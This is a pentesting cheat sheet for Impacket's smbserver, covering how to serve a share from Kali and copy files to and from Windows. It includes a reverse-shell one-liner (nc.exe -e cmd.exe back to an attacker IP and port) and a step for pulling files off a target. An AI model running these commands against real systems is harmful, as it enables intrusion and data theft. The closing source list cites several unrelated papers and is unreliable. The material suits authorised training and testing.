---
title: "smbshare"
description: "sudo impacket-smbserver share /path/to/share"
category: tools
tags: ["tools"]
tools: ["Impacket", "OpenSSL"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Misc/smbshare.md"
---
# Impacket SMB Share Cheat Sheet

#Impacket #impacket-smbserver #SMB #smbshare
## Basic Setup

**Start unauthenticated SMB server:**
```bash
sudo impacket-smbserver share /path/to/share
```

**Start SMB server with SMB2 support (required for modern Windows):**
```bash
sudo impacket-smbserver share /path/to/share -smb2support
```

**Share current directory:**
```bash
sudo impacket-smbserver share . -smb2support
```

## Authenticated Setup

**With username and password (recommended for Windows 10+):**
```bash
sudo impacket-smbserver share . -smb2support -username user -password pass123
```

## Windows Access

**View the share:**
```cmd
net view \\10.10.14.7
dir \\10.10.14.7\share
```

**Authenticate first (if using credentials):**
```cmd
net use \\10.10.14.7\share /user:user pass123
```

**Copy file TO Kali:**
```cmd
copy file.txt \\10.10.14.7\share\
```

**Copy file FROM Kali:**
```cmd
copy \\10.10.14.7\share\tool.exe C:\Temp\
```

**Execute directly from share:**
```cmd
\\10.10.14.7\share\nc.exe -e cmd.exe 10.10.14.7 4444
```

## Common Options

- `-smb2support` - Enable SMB2/3 protocol support 
- `-username` - Set authentication username 
- `-password` - Set authentication password 
- `-debug` - Enable debug output 

## Troubleshooting

If you get "unauthenticated guest access" errors, restart with authentication enabled .

Sources
 MDEval: Evaluating and Enhancing Markdown Awareness in Large Language
  Models https://arxiv.org/pdf/2501.15000v1.pdf
 Creating a vulnerable node based on the vulnerability MS17-010 http://arxiv.org/pdf/2401.14979.pdf
 SMoTherSpectre: exploiting speculative execution through port contention http://arxiv.org/pdf/1903.01843.pdf
 AmberMDrun: A Scripting Tool for Running Amber MD in an Easy Way https://www.mdpi.com/2218-273X/13/4/635/pdf?version=1680263131
 SmmPack: Obfuscation for SMM Modules with TPM Sealed Key http://arxiv.org/pdf/2405.04355.pdf
 iMIV: in-Memory Integrity Verification for NVM http://arxiv.org/pdf/2407.09180.pdf
 Apptainer Without Setuid https://arxiv.org/pdf/2208.12106.pdf
 Extracting the Secrets of OpenSSL with RAMBleed https://www.mdpi.com/1424-8220/22/9/3586/pdf?version=1652080720
 Impacket Cheatsheet https://rgbwiki.com/Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/
 Impacket Cheatsheet https://www.blackhillsinfosec.com/impacket-cheatsheet/
 Impacket - Offensive Security Cheatsheet https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/
 Zamanry/OSCP_Cheatsheet: OSCP Cheatsheet https://github.com/Zamanry/OSCP_Cheatsheet
 OSCP Cheat Sheet and Command Reference https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/
 Impacket Cheat Sheet for Pentesters https://nerdgigs.blog/2025/06/08/impacket-cheat-sheet-for-pentesters/
 Impacket Exec Commands Cheat Sheet Poster https://cdn.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf
 Impacket https://www.blackhillsinfosec.com/wp-content/uploads/2025/08/CheetSheet_Impacket-1.pdf
 OSCP Cheat Sheet | PDF https://www.scribd.com/document/693810531/OSCP-Cheat-Sheet
 File Transfer Cheatsheet For Pentesters https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/
 File Transfer - Offensive Security Cheatsheet https://cheatsheet.haax.fr/windows-systems/exploitation/file_transfer/
 SMB Enumeration Cheatsheet | 0xdf hacks stuff - GitLab https://0xdf.gitlab.io/cheatsheets/smb-enum
